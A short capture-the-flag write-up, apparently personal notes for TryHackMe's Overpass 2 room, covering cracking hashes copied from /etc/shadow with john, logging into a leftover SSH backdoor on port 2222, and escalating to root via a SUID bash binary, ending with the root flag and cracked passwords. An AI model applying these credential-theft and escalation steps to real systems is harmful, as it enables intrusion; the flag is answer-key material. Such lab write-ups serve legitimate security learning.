# Overpass2hacked

Examine capture file
Copy hashes from /etc/shadow for offline cracking with fasttrack.txt in john
ound 4 passwords
	• secret12         (bee)
	• abcd123          (szymex)
	• 1qaz2wsx         (muirland)
secuirty3        (paradox)

# Initial access
The hacker left a backdoor on **SSH port 2222**
Username: `james`
Password:`november16`

![[9ec9a0c9ac1d40e7966281e38594e7eb.png]]
# Enumeration
## Got kernel version
```
uname -a
```
## search for Linux Kernel 4.15 exploits
```
$ searchsploit linux 4.15
```
![[222b2b8221514397b12bb42fa1b6bd17.png]]

## Look around the file system
![[14ad1ed7b0de4b78ad5d7dd55c5665f9.png]]

### Abusing .suid_bash
![[0c17acc4b5e0495f959560adf18b733d.png]]

```
james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# whoami
root
.suid_bash-4.4# cd /root
.suid_bash-4.4# ls
root.txt
.suid_bash-4.4# cat root.txt
thm{d53b2684f169360bb9606c333873144d}
```

root flag `thm{d53b2684f169360bb9606c333873144d}`